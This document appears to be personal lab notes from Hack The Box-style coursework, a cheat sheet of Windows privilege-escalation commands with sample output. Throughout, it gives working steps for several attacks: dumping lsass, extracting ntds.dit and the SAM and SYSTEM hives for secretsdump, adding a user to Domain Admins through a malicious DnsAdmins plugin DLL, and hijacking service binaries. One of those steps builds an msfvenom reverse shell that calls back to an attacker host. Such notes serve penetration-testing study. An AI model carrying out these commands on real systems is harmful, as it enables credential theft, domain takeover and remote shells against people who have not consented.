


```python
// --------------------------------------------------------------- User Privileges  --------------------------------------------------------------- //


// --------------------- SeImpersonate  --------------------- //
Deadpotato 
JuicyPotato

// ------------------------------------------ SeTakeOwnerShip  ------------------------------------------ //

// Checking ownership before doing anything
cmd /c dir /q 'C:\Department Shares\Private\IT'

// Using take ownership
takeown /f 'C:\Department Shares\Private\IT\cred.txt'

// Checking the ACLs to see if we are actually owner
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

// using take owner we grant ourselves full access
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

// List of potentially important files
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav


// ------------------------------------------ SeDebugPrivilege  ------------------------------------------ //

// ------- Dumping lsass with procdump ------- //
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.

// -------    Enuerating to get RCE using psgetsys.ps1  ------- //

tasklist /svc ----> find something thats being run by system

// -------    Getting RCE using psgetsys.ps1  ------- //
ImpersonateFromParentPid -ppid 600 -command cmd.exe

// --------------------------------------------------------------- Group Privileges --------------------------------------------------------------- //

// ------------------------------------------ Backup Operators  ------------------------------------------ //
// LOCALLY 
// Enabling it
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Get-SeBackupPrivilege
Set-SeBackupPrivilege

// Copying a protected file
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

// Using diskshadow
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

// Using powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

// Saving registry 
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

// Using robocopy
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

/ --------------- Remotely --------------- /

// Secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

// reg.py
reg.py


// ------------------------------------------ Dns Admins  ------------------------------------------ //
msfvenom -p windows/x64/exec cmd='net group "domain admins" <Owned_User> /add /domain' -f dll -o adduser.dll
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

sc stop dns

sc start dns


// ------------------------------------------ Print Operators  ------------------------------------------ //
refer to the notes


// ------------------------------------------ Server Operators  ------------------------------------------ //
sc qc Service

sc qc AppReadiness

// we can use PsService to check the permissions on the service
c:\Tools\PsService.exe security AppReadiness

// we can then change the service path of said binary
sc config AppReadiness binPath= "cmd /c net localgroup Administrators Our_User /add"
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

// start the service to execute the command
sc start AppReadiness



// --------------------------------------------------------------- Credential Theft --------------------------------------------------------------- //

// DPAPI
// win auto logon
// winpeas just incase


// --------------------------------------------------------------- Service Exploitation --------------------------------------------------------------- //

// ------------------------ Unquoted Service Path ------------------------ //
// Enumerating
run wmic service get name, pathname (from CRTO)

SharpUp.exe audit UnquotedServicePath

wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v ""\"

// note that there is an escape character as \ please remove it before using



// ------------------------ Weak Service Permissions ------------------------ //
// NOTE: CANT ICACLS THIS BEACUSE ICACLS IS USED FOR FILES AND FOLDERS


C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS  <-------------------------------------- We can fuck around and find out



// So now that we know we can change the service binary lets change it ourselves
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"



// ------------------------ Lets stop and then run the service ------------------------ //
sc stop windscribeservice && sc stop windscribeservice


// ------------------------ Now lets check our group ------------------------ //

net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
htb-student  <---------------------- US!!!!
mrb3n



// -------------------------- Binary Permissions Abuse -------------------------- //

.\SharpUp.exe audit

=== Modifiable Service Binaries ===   <----------------------------------

  Name             : SecurityService
<..SNIP..>		   : <..SNIP..>
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"      <----------------------------------



// Now lets check the permissions

C:\Tools>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)      <--------------------- Full Permissions on the binary
                                                     NT AUTHORITY\SYSTEM:(I)(F)
													<..SNIP..>



// now lets create our MSFVENOM Payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.176 LPORT=8443 -f exe -o beacon2.exe



// Now lets transfer it over 

PS C:\Users\async_pentester-1> sc.exe config SecurityService binPath="C:\Temp\beacon2.exe"
[SC] ChangeServiceConfig SUCCESS
PS C:\Users\async_pentester-1> sc.exe start SecurityService

SERVICE_NAME: SecurityService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2296
        FLAGS              :
PS C:\Users\async_pentester-1>


// now we launch the service!

sc start SecurityService




```



# Unquoted Service 



// ------------------------ Unquoted service path ------------------------ //

// Enumerating
run wmic service get name, pathname (from CRTO)
SharpUp.exe audit UnquotedServicePath
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """


